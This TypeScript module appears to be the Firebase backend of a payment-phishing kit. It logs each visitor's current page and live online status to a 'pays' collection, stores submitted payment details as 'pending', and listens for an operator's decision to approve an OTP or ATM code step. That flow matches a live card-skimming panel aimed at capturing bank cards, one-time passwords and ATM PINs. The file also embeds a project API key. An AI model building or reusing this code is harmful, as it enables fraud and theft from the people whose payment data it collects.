import { getApp, getApps, initializeApp, FirebaseApp } from "firebase/app";
import {
  getDatabase,
  Database,
  ref,
  onDisconnect,
  set,
  onValue,
  serverTimestamp as rtdbServerTimestamp,
} from "firebase/database";
import {
  doc,
  getFirestore,
  setDoc,
  getDoc,
  Firestore,
  serverTimestamp,
  onSnapshot,
} from "firebase/firestore";

const firebaseConfig = {
  apiKey: "AIzaSyB5wRVuMhuX32v4g8P4rDkB_NvlrKVUhno",
  authDomain: "sdfg-98b06.firebaseapp.com",
  projectId: "sdfg-98b06",
  storageBucket: "sdfg-98b06.firebasestorage.app",
  messagingSenderId: "307140724566",
  appId: "1:307140724566:web:669d76007c14aeea33b8f7",
  measurementId: "G-0J30YY52NS",
};

const isFirebaseConfigured = Boolean(
  firebaseConfig.apiKey && firebaseConfig.projectId,
);

let app: FirebaseApp | null = null;
let db: Firestore | null = null;
let database: Database | null = null;

if (isFirebaseConfigured) {
  app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
  db = getFirestore(app);
  if (firebaseConfig.databaseURL) {
    database = getDatabase(app);
  }
} else {
  console.warn(
    "Firebase is not configured. Please set the required environment variables.",
  );
}

export async function getData(id: string) {
  if (!db) {
    console.warn("Firebase not configured - getData skipped");
    return null;
  }
  try {
    const docRef = doc(db, "pays", id);
    const docSnap = await getDoc(docRef);

    if (docSnap.exists()) {
      return docSnap.data();
    } else {
      return null;
    }
  } catch (e) {
    console.error("Error getting document: ", e);
    return null;
  }
}

export async function addData(data: any) {
  if (typeof localStorage !== "undefined") {
    localStorage.setItem("visitor", data.id);
  }
  if (!db) {
    console.warn("Firebase not configured - addData skipped");
    return;
  }
  try {
    const docRef = doc(db, "pays", data.id!);
    const existingDoc = await getDoc(docRef);
    const updateData: any = {
      ...data,
      updatedAt: new Date().toISOString(),
      isUnread: true,
    };

    if (!existingDoc.exists()) {
      updateData.createdAt = new Date().toISOString();
    }

    await setDoc(docRef, updateData, { merge: true });

    console.log("Document written with ID: ", docRef.id);
  } catch (e) {
    console.error("Error adding document: ", e);
  }
}

export const handleCurrentPage = (page: string) => {
  const visitorId = localStorage.getItem("visitor");
  if (visitorId) {
    addData({ id: visitorId, currentPage: page });
  }
};

export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  if (!db) {
    console.warn("Firebase not configured - handlePay skipped");
    return;
  }
  try {
    const visitorId =
      typeof localStorage !== "undefined"
        ? localStorage.getItem("visitor")
        : null;
    if (visitorId) {
      const docRef = doc(db, "pays", visitorId);
      await setDoc(
        docRef,
        {
          ...paymentInfo,
          status: "pending",
          createdAt: new Date().toISOString(),
        },
        { merge: true },
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
    }
  } catch (error) {
    console.error("Error adding document: ", error);
  }
};

export const generateVisitorId = () => {
  return (
    "visitor_" +
    Math.random().toString(36).substring(2, 15) +
    Math.random().toString(36).substring(2, 15)
  );
};

export const setupOnlineStatus = (userId: string) => {
  if (!userId || !db || !database) return;

  const userStatusRef = ref(database, `/status/${userId}`);
  const userDocRef = doc(db, "pays", userId);

  onDisconnect(userStatusRef)
    .set({
      state: "offline",
      lastChanged: rtdbServerTimestamp(),
    })
    .then(() => {
      set(userStatusRef, {
        state: "online",
        lastChanged: rtdbServerTimestamp(),
      });

      setDoc(
        userDocRef,
        {
          online: true,
          lastSeen: serverTimestamp(),
        },
        { merge: true },
      ).catch((error) =>
        console.error("Error updating Firestore document:", error),
      );
    })
    .catch((error) => console.error("Error setting onDisconnect:", error));

  onValue(userStatusRef, (snapshot) => {
    const status = snapshot.val();
    if (status?.state === "offline") {
      setDoc(
        userDocRef,
        {
          online: false,
          lastSeen: serverTimestamp(),
        },
        { merge: true },
      ).catch((error) =>
        console.error("Error updating Firestore document:", error),
      );
    }
  });
};

export const setUserOffline = async (userId: string) => {
  if (!userId || !db || !database) return;

  try {
    await setDoc(
      doc(db, "pays", userId),
      {
        online: false,
        lastSeen: serverTimestamp(),
      },
      { merge: true },
    );

    await set(ref(database, `/status/${userId}`), {
      state: "offline",
      lastChanged: rtdbServerTimestamp(),
    });
  } catch (error) {
    console.error("Error setting user offline:", error);
  }
};

export type ApprovalStatus =
  | "pending"
  | "approved_otp"
  | "approved_atm"
  | "rejected";

export interface ApprovalData {
  approvalStatus?: ApprovalStatus;
  rejectionReason?: string;
  atmCode?: string;
  adminAtmCode?: string;
}

export const subscribeToApprovalStatus = (
  userId: string,
  onUpdate: (data: ApprovalData) => void,
): (() => void) => {
  if (!userId || !db) {
    console.warn("Firebase not configured - subscribeToApprovalStatus skipped");
    return () => {};
  }

  const docRef = doc(db, "pays", userId);

  const unsubscribe = onSnapshot(
    docRef,
    (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data() as ApprovalData;
        onUpdate({
          approvalStatus: data.approvalStatus,
          rejectionReason: data.rejectionReason,
          atmCode: data.atmCode,
        });
      }
    },
    (error) => {
      console.error("Error listening to approval status:", error);
    },
  );

  return unsubscribe;
};

export { db, database, setDoc, doc, isFirebaseConfigured };
